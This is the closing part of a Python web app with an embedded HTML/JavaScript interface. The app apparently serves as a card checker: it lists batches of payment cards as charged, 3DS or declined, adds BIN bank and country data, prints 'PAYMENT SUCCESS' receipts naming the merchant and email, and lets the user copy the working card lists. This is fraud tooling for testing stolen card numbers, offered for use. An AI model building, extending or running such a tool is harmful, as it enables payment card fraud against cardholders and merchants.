      binHtml = `<div class="bin-badges">${badges}</div>`;
      if (bin.bank) binHtml += `<div class="bin-bank">${esc(bin.bank)}</div>`;
    }

    let bodyHtml = '';
    if (isCharged && ahCheckoutData) {
      const currency = (ahCheckoutData.currency || 'USD').toUpperCase();
      const price    = parseFloat(ahCheckoutData.price || 0).toFixed(2);
      const site     = ahCheckoutData.merchant || 'Unknown';
      const mail     = ahCheckoutData.email || 'N/A';
      const info     = [bin.brand, bin.type, bin.level].filter(Boolean).join(' - ') || 'N/A';
      const bank     = bin.bank    || 'N/A';
      const country  = (bin.country || 'N/A') + ' ' + (bin.country_flag || '');
      bodyHtml = `<div class="success-block">━━━━━━━━━━━━━━━\nPAYMENT SUCCESS\n━━━━━━━━━━━━━━━\nCard   : ${esc(data.card)}\nStatus : Paid\nAmount : ${currency} ${price}\nSite   : ${esc(site)}\nMail   : ${esc(mail)}\nInfo   : ${esc(info)}\nBank   : ${esc(bank)}\nCountry: ${esc(country.trim())}\n━━━━━━━━━━━━━━━</div>`;
    } else {
      const cls = is3DS ? 'is3ds' : '';
      bodyHtml = `<div class="res-response ${cls}">&gt; ${esc(data.response || 'No response')} (${data.time || 0}s)</div>`;
    }

    const card = document.createElement('div');
    const cardClass = isCharged ? 'charged' : (is3DS ? 'is3ds' : 'declined');
    card.className = `res-card ${cardClass}`;
    card.innerHTML = `
      <button class="btn-copy-card" onclick="copyCard(this)">Copy</button>
      <div class="res-cc">${esc(data.card || '')}</div>
      ${binHtml}
      ${bodyHtml}
    `;
    container.insertBefore(card, container.firstChild);
  }

  // ── Utilities ──────────────────────────────────────────────────────────────
  function copyCard(btn) {
    const cc = btn.nextElementSibling.textContent;
    navigator.clipboard.writeText(cc);
    btn.textContent = 'Copied!';
    setTimeout(() => btn.textContent = 'Copy', 1400);
  }

  function copyAll(type) {
    const list = type === 'charged' ? chargedList : declinedList;
    if (!list.length) return alert('Nothing to copy');
    const text = list.map(d => `${d.card} | ${d.status} | ${d.response}`).join('\\n');
    navigator.clipboard.writeText(text);
    alert(`Copied ${list.length} cards`);
  }

  function clearLogs() {
    chargedList = []; declinedList = [];
    document.getElementById('chargedCount').textContent  = '0';
    document.getElementById('declinedCount').textContent = '0';
    const empty = `<div class="empty"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>No cards yet</div>`;
    document.getElementById('chargedCards').innerHTML  = empty;
    document.getElementById('declinedCards').innerHTML = empty;
  }
</script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
